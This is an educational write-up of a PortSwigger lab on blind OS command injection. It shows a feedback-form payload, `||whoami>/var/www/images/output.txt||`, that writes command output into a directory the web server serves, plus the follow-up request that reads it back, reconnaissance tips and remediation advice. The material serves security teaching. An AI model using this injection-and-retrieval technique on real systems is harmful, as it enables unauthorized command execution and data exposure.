# Lab 3: Blind OS command injection with output redirection

**Category:** OS Command Injection
**Difficulty:** Practitioner
**Lab link:** [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

## Overview

Same injection point as Lab 2 (feedback form, `email` param, blind). Instead of timing-based detection, we **redirect command output to a file in a web-accessible directory**, then fetch that file via the product-image endpoint. Blind execution becomes full in-band read of any command's output.

## Key Concepts

- **Shell redirection (`>`)** writes stdout to a file. Standard POSIX, works in every shell.
- **`/var/www/images/`** is a common writable + web-exposed directory in LAMP/LEMP shops — and in this lab the exact path.
- **File-serving endpoints** (`/image?filename=...`) usually don't filter beyond "must exist in /var/www/images/" — so any file we write gets served.
- **Two-step attack:** separate the write (via injection) from the read (via a normal file-serve endpoint). Makes blind injection equivalent in power to non-blind.

## Burp Setup

- Proxy → intercept feedback-submit and any product-image request.
- Send both to Repeater (separate tabs).

## Solution

### Step 1 — Write command output to file

```
POST /feedback/submit HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<csrf>&name=x&email=||whoami>/var/www/images/output.txt||&subject=x&message=x
```

Send. Normal "feedback received" response. On the server, `whoami` ran and wrote output to the file.

### Step 2 — Retrieve the file via image endpoint

```
GET /image?filename=output.txt HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

Response body = `whoami` output (e.g. `peter-xxxxxx`). Lab solved.

## How It Works

- **Injection:** `||whoami>/var/www/images/output.txt||` runs on failure of the real email command.
- **Redirection:** `>` writes stdout to the file. Shell creates the file if it doesn't exist.
- **Retrieval:** `/image?filename=` serves anything in `/var/www/images/`. No check that the filename ends in a known image extension.

## Why `/var/www/images/`

Common web-root subdirectory that's both:
- Writable by the web process (image uploads land there).
- Served by the web server at a predictable URL.

Finding this directory on a real target is reconnaissance — look at image URLs, check for upload functionality, test `/uploads/`, `/media/`, etc.

## Why `||` Wraps the Injection

Same reason as Lab 2: real email command fails on `||...`, shell falls through to our write. Trailing `||` keeps the application logic unaware.

## Why It Worked

- Feedback endpoint concatenates `email` into a shell command string without escaping.
- Email value fails, `||` triggers fallthrough.
- Shell writes `whoami` output to a web-accessible path.
- `/image` endpoint serves it with no filename validation.

## Remediation

- **Exec-with-argv, not shell concatenation** (Lab 1/2 fix applies).
- **Separate writable directories from web-served directories.** Upload destinations should be outside the web root; a separate handler serves them with validation.
- **File-serve endpoints should allow-list file extensions** (`.jpg|.png|.gif`) and reject anything else, even if the file exists.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/os-command-injection/lab-03-blind-output-redirection/solve.py)

Two-stage: submit feedback with injection, then fetch `/image?filename=output.txt`.

## Key Takeaways

- **Write-then-read is the universal blind-to-in-band upgrade.** Any time you can execute and write to a web-accessible path, blind becomes non-blind.
- **File-serve endpoints with minimal filename validation** are the bridge between write and read.
- **Reconnaissance step:** find the writable+served directory before the attack. `/var/www/images/`, `/uploads/`, `/static/`, `/media/` are standard candidates.
- **Separate directories: upload dir vs web-served dir** is the root-cause fix. The lab's single-directory setup is the real bug.
